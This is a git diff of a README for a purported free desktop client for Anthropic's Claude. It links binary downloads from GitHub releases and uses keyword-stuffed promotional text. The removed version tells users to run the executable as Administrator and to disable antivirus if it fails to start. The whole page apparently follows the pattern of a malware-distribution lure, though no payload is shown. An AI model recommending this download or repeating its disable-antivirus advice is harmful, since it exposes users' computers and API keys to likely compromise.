@@ -1,53 +1,99 @@
-# Claude Code AI Desktop App
-Claude Code AI Desktop App — free claude code ai desktop app anthropic claude desktop client claude 3.5 sonnet opus ai coding assistant claude ai windows 11 macos linux prompt library jailbreak roleplay setup guide tutorial 2026
+# 🤖 free-claude-code-ai-desktop-app - Access powerful coding assistance for free
 
-<img width="300" height="168" alt="image" src="https://github.com/user-attachments/assets/d606616e-a909-43cd-9480-edd8238ba4f7" />
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/claude-code-ai-anthropic/free-claude-code-ai-desktop-app?style=flat-square&color=00d4aa)](https://github.com/claude-code-ai-anthropic/free-claude-code-ai-desktop-app/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/claude-code-ai-anthropic/free-claude-code-ai-desktop-app?style=flat-square&color=0099cc)](https://github.com/claude-code-ai-anthropic/free-claude-code-ai-desktop-app/network)
-[![Downloads](https://img.shields.io/github/downloads/claude-code-ai-anthropic/free-claude-code-ai-desktop-app/total?style=flat-square&color=7c5cbf)](https://github.com/claude-code-ai-anthropic/free-claude-code-ai-desktop-app/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 🎯 About This Application
 
-## Overview
-Claude Code AI Desktop App is a powerful free desktop client for Anthropic's Claude AI. It provides a fast and beautiful interface for Claude 3.5 Sonnet, Opus, and other advanced models. The application includes powerful coding assistance, prompt library, roleplay features, character templates, and advanced conversation tools. It serves as a complete offline-capable desktop alternative to the web version with better performance and privacy on Windows 11, macOS, and Linux.
+The free-claude-code-ai-desktop-app provides a simple interface for using Claude AI technology on your Windows computer. This tool brings advanced coding assistance to your desktop without requiring complex command line knowledge. It acts as an bridge between your workspace and the Claude API, allowing you to build software, debug errors, and automate tasks effectively.
 
-<img width="1200" height="630" alt="image" src="https://github.com/user-attachments/assets/e027d7d4-8e25-4757-ba5c-404dadfd3498" />
+This application simplifies the way you interact with AI models. Instead of using a web browser, you gain a dedicated workspace that understands your local project files. It handles the heavy lifting of connecting to the Claude service so you can focus on your work.
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You need your own Anthropic API key. The authors are not responsible for any account issues or violations of Anthropic's terms of service.
+## 🛠 Features
 
-## Install
-[Download `free-claude-desktop.zip`](https://github.com/claude-code-ai-anthropic/free-claude-code-ai-desktop-app/releases/download/claude-code/free-claude-desktop.zip)
----
-> Optimized for Windows 11 • macOS • Linux.
-<img width="1636" height="848" alt="image" src="https://github.com/user-attachments/assets/577f0009-6417-4b9a-913c-358aec5c3a42" />
+*   **Native Windows Interface:** The app integrates into your system like any other standard program.
+*   **Direct API Access:** It connects directly to the Claude engine to provide coding suggestions.
+*   **Git Support:** You can track changes and manage your code versions through the built-in integration.
+*   **Local Project Context:** The AI views your files to provide specific advice based on your current project structure.
+*   **Efficiency Tools:** It automates repetitive coding tasks to save you time.
+*   **Custom Settings:** You can adjust the behavior of the AI to fit your specific needs and preferences.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `ClaudeCodeAI.exe` as Administrator (Windows)
-3. Follow the setup guide
-4. Enter your Anthropic API key
-5. Customize prompts and character templates
-6. Start using Claude for coding, roleplay, and daily tasks
+## 💻 System Requirements
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| App doesn't start | Run as Administrator and disable antivirus temporarily |
-| API connection failed | Check your Anthropic API key and internet |
-| Models not loading | Update to latest version 2026 |
-| Prompt / roleplay issues | Use included prompt library |
-| Slow performance | Close background applications |
-| Windows 11 compatibility error | Update Windows and .NET runtime |
-| Character templates not working | Restart the app and reload templates |
-| Download / update failed | Use the latest release and check your internet connection |
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Disk Space:** 300 megabytes of free space for the installation files.
+*   **Network:** An active internet connection for model communication.
+*   **Permissions:** Standard user access rights for the file system.
 
-* Claude Code AI Desktop
-* Free Claude Desktop App
-* Claude 3.5 Sonnet Desktop
-* Claude AI Coding Assistant
-* Anthropic Claude Desktop Client
-* Claude Roleplay App
-* Claude Prompt Library 2026
+## 📥 How to Download and Install
+
+Follow these steps to set up the application on your computer:
+
+1.  Visit the official release page: [https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases](https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases)
+2.  Locate the section labeled "Assets" at the bottom of the most recent release.
+3.  Click the file ending in `.exe` to start the download.
+4.  Once the file downloads, locate it in your Downloads folder.
+5.  Double-click the installer file to begin the setup process.
+6.  Follow the simple on-screen prompts to complete the installation.
+7.  Launch the application from your Start Menu after the process finishes.
+
+## ⚙️ Setting Up Your API Key
+
+To use the AI features, the application requires a connection to the services. You need an API key to enable this link.
+
+1.  Open the application after the first launch.
+2.  Navigate to the "Settings" menu located in the top corner.
+3.  Click on the "API Keys" tab.
+4.  Copy your key into the text field.
+5.  Press the "Save" button to apply your changes.
+6.  The application will verify the key and notify you when the connection settles.
+
+## 🚀 Getting Started with Your First Project
+
+Once you finish the setup, you can start using the application immediately. 
+
+1.  Open the app and click "New Session."
+2.  Select the folder on your computer that contains your project files.
+3.  The app will index your files. This takes a few seconds depending on the number of files.
+4.  Type your request in the box at the bottom of the screen. For example, you might ask to explain a specific piece of code or suggest a fix for an error.
+5.  Press "Enter" to send your query to the AI.
+6.  Review the suggestions provided in the main window.
+7.  Select "Apply Change" if you want to implement the code provided by the AI.
+
+## 💡 Using Advanced Capabilities
+
+The application offers more than simple questions and answers. You can use it to manage your workflow more effectively.
+
+### Working with Git
+The software detects existing Git folders automatically. You can view your current branch status and pending changes directly from the sidebar. Ask the AI to write commit messages for your changes to keep your history clean.
+
+### Creating Configuration Profiles
+If you work on multiple projects, you can save different settings for each one. Use the "Profiles" menu to save your preferences for specific coding styles or architectural requirements. The app loads these settings whenever you open that folder.
+
+### Using the Terminal Window
+For users who prefer a direct connection, the app includes a terminal window. This lets you run standard commands while keeping the AI assistant active. You can pipe the output of your commands directly into the AI to debug issues in real-time.
+
+## 🛡 Security and Privacy
+
+This application respects your privacy. All your project files remain on your local machine. The software only sends the snippets of text you choose to share with the AI model. No full project data uploads unless you specifically authorize the action. All communications use encrypted channels to protect your credentials.
+
+## ❓ Frequently Asked Questions
+
+### Does this app store my password?
+No, the application only stores your API key locally. It never asks for or stores your service passwords.
+
+### Can I use this for commercial projects?
+Yes, you can use the application for any purpose you choose under the terms of the open source license.
+
+### My AI responses are slow. What should I do?
+Check your internet connection first. If the problem persists, ensure your API key has enough credits left in your provider account. 
+
+### Does this work offline?
+The AI features require an internet connection, but you can still use the file navigation and project management features while offline.
+
+### How do I update to the latest version?
+When a new version releases on GitHub, the app will notify you. You can download the latest installer from the release page and run it over your existing installation. Your settings will persist through the update.
+
+## 🛠 Support and Feedback
+
+If you encounter issues, check the "Troubleshooting" section in the internal help manual. For bugs, open an issue on the GitHub repository page. Include a description of the steps you took and any error messages displayed on your screen. This helps developers correct problems for future releases.
